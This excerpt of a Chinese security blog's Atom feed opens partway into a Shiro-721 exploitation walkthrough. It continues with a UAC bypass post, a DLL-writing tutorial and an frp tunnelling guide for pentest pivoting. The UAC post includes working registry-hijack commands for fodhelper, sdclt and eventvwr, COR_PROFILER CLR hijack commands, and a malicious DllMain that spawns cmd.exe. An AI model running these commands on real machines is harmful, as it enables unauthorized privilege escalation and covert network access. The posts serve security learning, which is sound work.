href="https://github.com/jas502n/SHIRO-721/blob/master/samples-web-1.4.1.war%EF%BC%8C%E5%B9%B6%E6%94%BE%E5%85%A5tomcat">https://github.com/jas502n/SHIRO-721/blob/master/samples-web-1.4.1.war，并放入tomcat</a> webapps文件夹，随后启动tomcat，访问<a href="http://127.0.0.1:8080/samples-web-1.4.1/">http://127.0.0.1:8080/samples-web-1.4.1/</a></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310220716846.png" alt="image-20210310220716846"></p><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>大致逻辑与shiro-550差不多，直接说利用吧。</p><p><a href="https://github.com/inspiringz/Shiro-721">https://github.com/inspiringz/Shiro-721</a> 使用这个工具</p><p>首先我们得勾选rememberme，抓包获得rememberme cookie</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310221230268.png" alt="image-20210310221230268"></p><p>然后通过ysoserial生成payload，将其通过管道符传入某个文件，随后用刚刚那个工具里的shiro_exp.py</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python .&#x2F;shiro_exp.py &lt;url&gt; &lt;cookie&gt; &lt;paylaod文件&gt;</span><br></pre></td></tr></table></figure><p>随后会进行爆破，最后获得结果cookie后，传入并发包过去即可（爆破时间很长）</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310224415067.png" alt="image-20210310224415067"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h1&gt;&lt;h1 id=&quot;shiro&quot;&gt;&lt;a href=&quot;#shiro&quot; class=&quot;headerlink&quot; title=&quot;shiro&quot;&gt;&lt;/a&gt;shiro&lt;/h1&gt;&lt;p</summary>
      
    
    
    
    
    <category term="java开发与安全" scheme="http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>BypassUAC</title>
    <link href="http://const27.com/2021/03/04/Bypass%20UAC/"/>
    <id>http://const27.com/2021/03/04/Bypass%20UAC/</id>
    <published>2021-03-04T04:17:40.052Z</published>
    <updated>2021-03-04T04:21:23.507Z</updated>
    
    <content type="html"><![CDATA[<h1 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h1><p>用户帐户控制（User Account Control，简写作UAC)是<a href="https://baike.baidu.com/item/%E5%BE%AE%E8%BD%AF">微软</a>公司在其[Windows Vista](<a href="https://baike.baidu.com/item/Windows">https://baike.baidu.com/item/Windows</a> Vista)及更高版本操作系统中采用的一种控制机制，保护系统进行不必要的更改，提升操作系统的稳定性和安全性。<br>管理员在正常情况下是以低权限运行任务的，这个状态被称为被保护的管理员。但当管理员要执行高风险操作（如安装程序等），就需要提升权限去完成这些任务。这个提升权限的过程通常是这样的，相信各位都眼熟过。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210227191310985.png" alt="image-20210227191310985"></p><p>点击“是”，管理员就会提升到高权限再去运行该任务。</p><h1 id="autoElevate与requestedExecutionLevel"><a href="#autoElevate与requestedExecutionLevel" class="headerlink" title="autoElevate与requestedExecutionLevel"></a>autoElevate与requestedExecutionLevel</h1><h2 id="autoElevate"><a href="#autoElevate" class="headerlink" title="autoElevate"></a>autoElevate</h2><p>当某个EXE文件的文件清单里有&lt;autoElevate&gt; 元素时，当执行该文件时会默认提权执行。<br>我们劫持该exe文件的dll，可以达到Bypass UAC提权的目的。<br>适用范围:管理员权限以获得，要得到高权限管理员权限</p><p>一般用工具sigcheck检测</p><p>网上常拿C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe 举列子</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210301000136728.png" alt="image-20210301000136728"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210301000141880.png" alt="image-20210301000141880"></p><p>这个东西很有用，是下面部分方法的前提条件</p><h2 id="requestedExecutionLevel"><a href="#requestedExecutionLevel" class="headerlink" title="requestedExecutionLevel"></a>requestedExecutionLevel</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302125607741.png" alt="image-20210302125607741"></p><p>有三个不同的参数：asInvoker requireAdministrator highestAvailable 分别对应应用程序以什么权限运行</p><p>asInvoker：父进程是什么权限，此应用程序就是什么权限</p><p>requireAdministrator：需要以管理员权限来运行，此类应用程序图标右下方会有个盾牌标记<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302125851318.png" alt="image-20210302125851318"></p><p>highestAvailable：此程序以当前用户能获取到的最高权限运行。当你在管理员账户下运行此程序就会要求权限提升以及弹出UAC框。当你在标准账户下运行此程序，由于此账户的最高权限就是标准账户，所以双击便运行</p><h1 id="白名单程序"><a href="#白名单程序" class="headerlink" title="白名单程序"></a>白名单程序</h1><p>除了刚刚说的autoelevate，还有一类叫白名单程序的应用程序也是打开默认提权的。如服务管理工具下的许多应用都属于白名单程序，而其中又有些程序执行时需要依赖CLR支持（如事件查看器，任务计划程序）</p><h1 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h1><h2 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h2><p>reference:<a href="https://www.anquanke.com/post/id/209033">https://www.anquanke.com/post/id/209033</a><br><a href="https://www.cnblogs.com/0daybug/p/11719541.html">https://www.cnblogs.com/0daybug/p/11719541.html</a></p><p>exe文件运行时会加载许多dll文件，这些dll文件的加载顺序是</p><ul><li><p>程序所在目录</p></li><li><p>系统目录即<code>SYSTEM32</code>目录</p></li><li><p>16位系统目录即<code>SYSTEM</code>目录</p></li><li><p><code>Windows</code>目录</p></li><li><p>程序加载目录(<code>SetCurrentDirecctory</code>)</p></li><li><p><code>PATH</code>环境变量中列出的目录</p><p>同时，dll加载也遵循着<code>Know DLLs注册表项</code>的机制：Know DLLs注册表项指定的DLL是已经被操作系统加载过后的DLL，不会被应用程序搜索并加载。在注册表HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLS处可以看见这些dll</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210301184035776.png" alt="image-20210301184035776"></p></li></ul><p>在knowdlls表项中的dll是预先就加载进内存空间的，被诸多应用调用着，改动需要高权限。</p><p>如果我们在应用程序找到正确的dll之前，将我们自己创造的dll放入优先级更高的搜索目录让应用程序优先加载此dll文件，这就造成了dll劫持。但这只是dll劫持的其中一种途径，他有这些途径：</p><p>（1） DLL替换：用恶意的DLL替换掉合法的DLL<br>（2） DLL搜索顺序劫持：当应用程序加载DLL的时候，如果没有带指定DLL的路径，那么程序将会以特定的顺序依次在指定的路径下搜索待加载的DLL。通过将恶意DLL放在真实DLL之前的搜索位置，就可以劫持搜索顺序，劫持的目录有时候包括目标应用程序的工作目录。<br>（3） 虚拟DLL劫持：释放一个恶意的DLL来代替合法应用程序加载的丢失/不存在的DLL<br>（4） DLL重定向：更改DLL搜索的路径，比如通过编辑%PATH%环境变量或 .exe.manifest/.exe.local文件以将搜索路径定位到包含恶意DLL的地方。<br>（5） WinSxS DLL替换：将目标DLL相关的WinSxS文件夹中的恶意DLL替换为合法的DLL。此方法通常也被称为DLL侧加载<br>（6） 相对路径DLL劫持：将合法的应用程序复制（并有选择地重命名）与恶意的DLL一起放入到用户可写的文件夹中。在使用方法上，它与（签名的）二进制代理执行有相似之处。它的一个变体是（有点矛盾地称为）“自带LOLbin”，其中合法的应用程序带有恶意的DLL（而不是从受害者机器上的合法位置复制）。</p><h4 id="实践出真知1"><a href="#实践出真知1" class="headerlink" title="实践出真知1"></a>实践出真知1</h4><p>这里我们先用第一种方法来进行实验，实验对象是C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe和Listary。Listary是一个很好用的检索小工具，我通过processmonitor，设置好过滤条件，查看SystemPropertiesAdvanced.exe调用的dll时发现它会调用一个Listary下的一个名为ListaryHook.dll的dll。<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302132631680.png" alt="image-20210302132631680"></p><p>由于listary目录权限不高，我们可以直接替换该dll，换成dllmain为打开cmd的dll。然后点击运行SystemPropertiesAdvanced.exe，就会发现会弹出高权限cmd窗口<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302132724843.png" alt="image-20210302132724843"></p><p>bypassuac成功。 当然这种都不能算是一个洞，listary并不是人人电脑上都有的，而且这个软件装机量应该是极少数少的，所以这里只是提供一个思路，这种洞该怎么去找。</p><h4 id="实践出真知2"><a href="#实践出真知2" class="headerlink" title="实践出真知2"></a>实践出真知2</h4><p>这里使用第三种方法进行实验，实验对象是eventvwr.msc，它是管理工具中的事件查看器，它依赖于mmc.exe来运行。比如，你想运行它，就得通过mmc eventvwr.msc来运行它,并且在process exploer中只能看到个mmc.exe。</p><p>我们process monitor设置过滤如下</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302205938167.png" alt="image-20210302205938167"></p><p>cmd运行 mmc eventvwr.msc,查看调用</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302210053342.png" alt="image-20210302210053342"></p><p>dll搜索顺序确实是 程序目录-&gt;SYSTEM32-&gt;SYSTEM-&gt;WINDOWS-&gt;当前目录（这里也是SYSTEM32目录，我认为的原因是mmc会自动提升权限导致当前目录为System32导致的）-&gt;PATH目录。</p><p>我们只需在可写目录下植入名为elsext.dll的恶意dll，处理好dll的dllmain函数，就能让dllmain里的指令被高权限执行</p><p>但是无奈我这里环境是win7 sp1,但是这个洞7600才出现，所以复现不了了。但大概思路就是这样的</p><h2 id="CLR加载任意DLL"><a href="#CLR加载任意DLL" class="headerlink" title="CLR加载任意DLL"></a>CLR加载任意DLL</h2><p>CLR是微软为.net运行时提供的环境，像java的虚拟机一样，而clr有一个Profiling机制。这个机制简而言之便是可以给CLR提供一个dll，当任何高权限.NET运行时都会主动加载该DLL，我们可以构造恶意dll给CLR加载，从而获得高权限的进程如cmd，从而bypassuac。</p><p>至于这个dll如何给CLR，是通过修改以下环境变量实现的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">COR_ENABLE_PROFILING &#x3D; 1</span><br><span class="line"></span><br><span class="line">COR_PROFILER&#x3D;&#123;CLSIDor ProgID&#125;</span><br></pre></td></tr></table></figure><p>CLR会检查环境变量中的COR_ENABLE_PROFILING，若为1则检查通过，进行下一步。<br>在net4.0以前，若检查通过，会马上去查找COR_PROFILER指定的注册表项，找到其dll路径并加载<br>net4.0后，会先查找COR_PROFILER_PATH是否指定dll文件路径，若没有再去查找COR_PROFILER指定的注册表项，找到其dll路径并加载。<br>总而言之，我们设置好COR_ENABLE_PROFILING和COR_PROFILER两个项就可以了。</p><p>接下来我们设置用户环境变量，设置用户环境变量时不需要高权限（win10似乎设置系统环境变量也不需要）。<br>以及在注册表，在指定的CLSID属性下新建Inprocserver32项，并写入恶意dll路径. 然后通过mmc调用一下gpedit.msc这种程序，即可以高权限执行dll。如果dll执行命令为system(“cmd.exe”)  那么就会蹦出来高权限cmd窗口</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKCU\Software\Classes\CLSID\&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;\InprocServer32&quot; &#x2F;ve &#x2F;t REG_EXPAND_SZ &#x2F;d &quot;C:\test\calc.dll&quot; &#x2F;f</span><br><span class="line">REG ADD &quot;HKCU\Environment&quot; &#x2F;v &quot;COR_PROFILER&quot; &#x2F;t REG_SZ &#x2F;d &quot;&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;&quot; &#x2F;f</span><br><span class="line">REG ADD &quot;HKCU\Environment&quot; &#x2F;v &quot;COR_ENABLE_PROFILING&quot; &#x2F;t REG_SZ &#x2F;d &quot;1&quot; &#x2F;f</span><br><span class="line">mmc gpedit.msc</span><br></pre></td></tr></table></figure><p>但我死活复现不起不知道为啥，我的dll这样写的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)</span><br><span class="line">&#123;</span><br><span class="line">    char cmd[] &#x3D; &quot;cmd.exe&quot;;</span><br><span class="line"></span><br><span class="line">    switch (fdwReason)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        WinExec(cmd, SW_SHOWNORMAL);</span><br><span class="line">        ExitProcess(0);</span><br><span class="line">        break;</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">        break;</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外的，你还可以为COR_PROFILER_PATH设置为如\\server\share\test.dll的smb的路径，这样也可以实现bypassuac（没复现）</p><h2 id="白名单程序-1"><a href="#白名单程序-1" class="headerlink" title="白名单程序"></a>白名单程序</h2><h3 id="odbcad32-exe"><a href="#odbcad32-exe" class="headerlink" title="odbcad32.exe"></a>odbcad32.exe</h3><p>这个方法很简单。打开C:\Windows\system32\odbcad32.exe，然后通过以下方法打开powershell或者cmd</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302133941728.png" alt="image-20210302133941728"></p><p>成功bypass</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302134014137.png" alt="image-20210302134014137"></p><h3 id="管理工具"><a href="#管理工具" class="headerlink" title="管理工具"></a>管理工具</h3><p>之前说过，管理工具有很多白名单程序，如果一个白名单程序有浏览文件目录的功能，就可以以此来创建高权限cmd窗口。这里拿事件查看器举例</p><p>操作-》打开保存的目录-》文件目录路径处输入powershell-》弹出高权限powershell    以此内推，还有很多相似的管理工具可以这样利用</p><h2 id="注册表劫持"><a href="#注册表劫持" class="headerlink" title="注册表劫持"></a>注册表劫持</h2><h3 id="Fodhelper-exe"><a href="#Fodhelper-exe" class="headerlink" title="Fodhelper.exe"></a>Fodhelper.exe</h3><p>Fodhelper.exe win10才有，所以只有win10能通过这个办法bypassuac，他是一个autoelevate元素程序</p><p>我们使用proceemonitor查看事件查看器启动的时候执行了什么。我们通过排查发现了此处</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302194843185.png" alt="image-20210302194843185"></p><p>发现程序试图打开HKCU\Software\Classes\ms-settings\shell\open\command，但是这个项没有找到，因为这个项并不存在，于是它查询 HKCR\ms-settings\Shell\Open,查询成功便打开其下的Command键进行查询。<br>我们可以劫持注册表，往HKCU\Software\Classes\ms-settings\shell\open\command写入恶意指令从而达到bypassuac的目的。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command &#x2F;d C:\Windows\System32\cmd.exe &#x2F;f </span><br><span class="line">reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command &#x2F;v DelegateExecute &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br></pre></td></tr></table></figure><p>我们写入如下命令，就能让Fodhelper.exe 执行时自动高权限执行cmd窗口了</p><p>然后消除痕迹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg delete &quot;HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command&quot;</span><br></pre></td></tr></table></figure><h3 id="sdclt"><a href="#sdclt" class="headerlink" title="sdclt"></a>sdclt</h3><p>Win10后这个程序才有自动提升权限的能力</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKCU\Software\Classes\Folder\shell\open\command&quot; &#x2F;d C:\Windows\System32\cmd.exe &#x2F;f </span><br><span class="line">reg add &quot;HKCU\Software\Classes\Folder\shell\open\command&quot; &#x2F;v &quot;DelegateExecute&quot; &#x2F;f</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302201240945.png" alt="image-20210302201240945"></p><h3 id="eventvmr"><a href="#eventvmr" class="headerlink" title="eventvmr"></a>eventvmr</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKCU\Software\Classes\mscfile\shell\open\command&quot; &#x2F;d C:\Windows\System32\cmd.exe &#x2F;f</span><br></pre></td></tr></table></figure><p>win10，win7均无效,不知道是哪个版本的事了，反正记录下来吧。</p><h2 id="COM劫持"><a href="#COM劫持" class="headerlink" title="COM劫持"></a>COM劫持</h2><h1 id="UACME"><a href="#UACME" class="headerlink" title="UACME"></a>UACME</h1><p>一个开源项目，记录了许多Bypassuac的方法。</p><p><a href="https://github.com/hfiref0x/UACME/tree/v3.2.x">https://github.com/hfiref0x/UACME/tree/v3.2.x</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;UAC&quot;&gt;&lt;a href=&quot;#UAC&quot; class=&quot;headerlink&quot; title=&quot;UAC&quot;&gt;&lt;/a&gt;UAC&lt;/h1&gt;&lt;p&gt;用户帐户控制（User Account Control，简写作UAC)是&lt;a href=&quot;https://baike.baidu.c</summary>
      
    
    
    
    
    <category term="提权" scheme="http://const27.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>dll文件编写</title>
    <link href="http://const27.com/2021/03/04/dll%E6%96%87%E4%BB%B6%E7%BC%96%E5%86%99/"/>
    <id>http://const27.com/2021/03/04/dll%E6%96%87%E4%BB%B6%E7%BC%96%E5%86%99/</id>
    <published>2021-03-04T04:17:29.391Z</published>
    <updated>2021-03-01T11:48:36.631Z</updated>
    
    <content type="html"><![CDATA[<p>DLL文件，即动态链接库文件，在windows中许多pe文件运行时需要将一些dll文件加载进内存，从而调用dll文件里的内容。</p><h1 id="DLLMAIN"><a href="#DLLMAIN" class="headerlink" title="DLLMAIN"></a>DLLMAIN</h1><p>dllmain，是dll在被加载时执行的函数（dllmain在dll文件中不是必须的）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BOOL WINAPI DLLMain(</span><br><span class="line">&#x2F;&#x2F;指向自身句柄</span><br><span class="line">_In_HINSTANCE hinstDLL,</span><br><span class="line">&#x2F;&#x2F;载入状态</span><br><span class="line">_In_DWORD fdwReason,</span><br><span class="line">&#x2F;&#x2F;加载方式（隐式、显式）</span><br><span class="line">_In_LPVOID IpvReserved</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>其中，载入状态有四种，如下</p><p>DLL_PROCESS_ATTACH：进程进入时</p><p>DLL_PROCESS_DETACH：进程退出时</p><p>DLL_THREAD_ATTACH：线程进入时</p><p>DLL_THREAD_DETACH：线程退出时</p><p>dllmain根据载入状态的不同，可以做出不同的反应。就像这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">                     )</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">case DLL_PROCESS_ATTACH:</span><br><span class="line">std::cout &lt;&lt; &quot;Process attach. \n&quot;;</span><br><span class="line">break;</span><br><span class="line">case DLL_PROCESS_DETACH:</span><br><span class="line">std::cout &lt;&lt; &quot;Process exit. \n&quot;;</span><br><span class="line">break;</span><br><span class="line">case DLL_THREAD_ATTACH:</span><br><span class="line">std::cout &lt;&lt; &quot;Thread attach. \n&quot;;</span><br><span class="line">break;</span><br><span class="line">case DLL_THREAD_DETACH:</span><br><span class="line">std::cout &lt;&lt; &quot;Thread exit. \n&quot;;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="DLL-导出函数"><a href="#DLL-导出函数" class="headerlink" title="DLL 导出函数"></a>DLL 导出函数</h1><p>dll编写时，要用__declspec关键字标明哪些函数是要导出的,_</p><p>__declspec(dllexport) 用于Windows中的动态库中，声明导出函数、类、对象等供外面调用,像这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extern &quot;C&quot; int _declspec(dllexport) go() &#123;</span><br><span class="line">    std::cout&lt;&lt;&quot;gogo&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就设置好一个用于导出的函数了。</p><h2 id="题外话：怎么使用dll或lib中的导出函数"><a href="#题外话：怎么使用dll或lib中的导出函数" class="headerlink" title="题外话：怎么使用dll或lib中的导出函数"></a>题外话：怎么使用dll或lib中的导出函数</h2><p>对于lib（静态链接库）来说，使用静态链接  dll（动态链接库）来说使用动态链接</p><h3 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h3><p>又叫隐式链接。链接器从库中复制这些函数和数据并把它们和应用程序的其它模块组合起来创建最终的可执行文件(.EXE文件)，所以组成的exe文件体积较大</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#pragma comment(lib,&quot;testDLL.lib&quot;)  &#x2F;&#x2F;在此处通过静态链接，此之前把生成的lib文件放入loadDLL工程文件夹下面，并设置编译器的附加依赖项中增加此lib</span><br><span class="line">extern &quot;C&quot;_declspec(dllimport) int go(); &#x2F;&#x2F;声明函数</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">go();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h3><p>又叫显示链接，将一些api函数写入到一个dll文件中，在程序在程序运行时再加载到程序的进程空间中使用，这样可以让运行程序本身体积较小，方便模块化编程。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int TestDLL()</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">      HMODULE hModule &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">      typedef int (*Func)(int a, int b);</span><br><span class="line"></span><br><span class="line">      &#x2F;&#x2F; 动态加载 DLL 文件</span><br><span class="line">      hModule &#x3D; LoadLibrary(_TEXT(&quot;..&#x2F;&#x2F;Debug&#x2F;&#x2F;FuncDll.dll&quot; ));</span><br><span class="line"></span><br><span class="line">      &#x2F;&#x2F; 获取 fun函数地址</span><br><span class="line">      Func fAdd &#x3D; (Func)GetProcAddress(hModule, &quot;fun&quot; );</span><br><span class="line"></span><br><span class="line">      &#x2F;&#x2F; 使用函数指针</span><br><span class="line">      printf(&quot;%d&#x2F;n&quot; , fAdd(3, 1));</span><br><span class="line"></span><br><span class="line">      &#x2F;&#x2F; 释放指针</span><br><span class="line">      FreeLibrary(hModule);</span><br><span class="line">      return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="rundll32"><a href="#rundll32" class="headerlink" title="rundll32"></a>rundll32</h1><p>用rundll32.exe 可以执行dll中的某一导出函数</p><p>但是不是所有函数都能通过rundll32调用，函数必须符合如下定义</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">VOID CALLBACK FunctionName (HWND hwnd,HINSTANCE hinst,LPTSTR lpCmdLine,INT nCmdShow);</span><br></pre></td></tr></table></figure><p>这里随便写了个</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extern &quot;C&quot; __declspec(dllexport) void rundll(HWND hwnd, HINSTANCE hinst, LPTSTR lpCmdLine, INT nCmdShow) &#123;</span><br><span class="line"></span><br><span class="line">    MessageBox(NULL, TEXT(&quot;-Test-&quot;), TEXT(&quot;Rundll32&quot;), MB_OK);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210301194831320.png" alt="image-20210301194831320"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;DLL文件，即动态链接库文件，在windows中许多pe文件运行时需要将一些dll文件加载进内存，从而调用dll文件里的内容。&lt;/p&gt;
&lt;h1 id=&quot;DLLMAIN&quot;&gt;&lt;a href=&quot;#DLLMAIN&quot; class=&quot;headerlink&quot; title=&quot;DLLMAIN</summary>
      
    
    
    
    
    <category term="windows相关" scheme="http://const27.com/tags/windows%E7%9B%B8%E5%85%B3/"/>
    
  </entry>
  
  <entry>
    <title>frp使用</title>
    <link href="http://const27.com/2021/02/26/%E4%B8%80%E4%BA%9B%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    <id>http://const27.com/2021/02/26/%E4%B8%80%E4%BA%9B%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</id>
    <published>2021-02-26T12:53:42.913Z</published>
    <updated>2021-02-26T11:36:31.938Z</updated>
    
    <content type="html"><![CDATA[<h1 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h1><p>frp，确实蛮好用的，他基本不会被杀软杀掉。而且无论是win到win，linux到linux还是win到linux的转发，它都支持。 Download；<a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p><p>frp分为有两个主要可执行文件，frps和frpc，对应的配置文件为frps.ini和frpc.ini。</p><p>其中frps用作服务端，在进行渗透的时候一般架设在公网VPS上，它的配置文件默认为这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 10067  #监听的端口</span><br><span class="line"></span><br><span class="line">运行 frps -c frps.ini</span><br></pre></td></tr></table></figure><p>frpc用作客户端，在进行渗透的时候一般假设在内网机器上，它的默认文件一般长这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 149.17.4.190 # 指定需要转发到的公网IP</span><br><span class="line">server_port &#x3D; 10067 # 公网VPS上所监听的端口</span><br><span class="line"></span><br><span class="line">[socks_proxy] # 标签名，任意</span><br><span class="line">type &#x3D; tcp #设置转发的协议</span><br><span class="line">local_ip&#x3D;127.0.0.1 #填127.0.0.1就完事了</span><br><span class="line">local_port&#x3D;3389 #需要被转发的端口</span><br><span class="line">remote_port&#x3D;10068 #转发到VPS上的端口</span><br><span class="line"></span><br><span class="line">运行 frpc -c frpc.ini</span><br></pre></td></tr></table></figure><p>当我们在VPS上运行frps，内网机器运行frpc后，内网机器的3389端口就会被转发到公网的10068端口上，接下来我们远程链接 149.17.4.190:10068 即可连进内网机器的远程桌面了。</p><p>上面是端口映射，下面是直接走socks5代理</p><p>服务端:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr &#x3D; 0.0.0.0</span><br><span class="line">bind_port &#x3D; 7000</span><br><span class="line"> </span><br><span class="line"># 用户密码保平安</span><br><span class="line">dashboard_user &#x3D; admin1</span><br><span class="line">dashboard_pwd &#x3D; hadaessd@@@!!@@#</span><br><span class="line"># 允许客户端绑定的端口</span><br><span class="line">allow_ports &#x3D; 40000-50000</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">#remote vps addr</span><br><span class="line">server_addr &#x3D; your vps addr</span><br><span class="line">#端口自选</span><br><span class="line">server_port &#x3D; 7000   </span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line">pool_count &#x3D; 5</span><br><span class="line"> </span><br><span class="line">[plugin_socks]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 46075</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line">plugin_user &#x3D; admin</span><br><span class="line">plugin_passwd &#x3D; hahha@@###</span><br><span class="line">use_encryption &#x3D; true</span><br><span class="line">use_compression &#x3D; true</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;frp&quot;&gt;&lt;a href=&quot;#frp&quot; class=&quot;headerlink&quot; title=&quot;frp&quot;&gt;&lt;/a&gt;frp&lt;/h1&gt;&lt;p&gt;frp，确实蛮好用的，他基本不会被杀软杀掉。而且无论是win到win，linux到linux还是win到linux的转发，它都支持。</summary>
      
    
    
    
    
    <category term="内网渗透" scheme="http://const27.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>java安全中几个重要机制</title>
    <link href="http://const27.com/2021/02/19/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/"/>
    <id>http://const27.com/2021/02/19/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/</id>
    <published>2021-02-19T09:22:05.038Z</published>
    <updated>2021-02-19T08:47:49.404Z</updated>
    
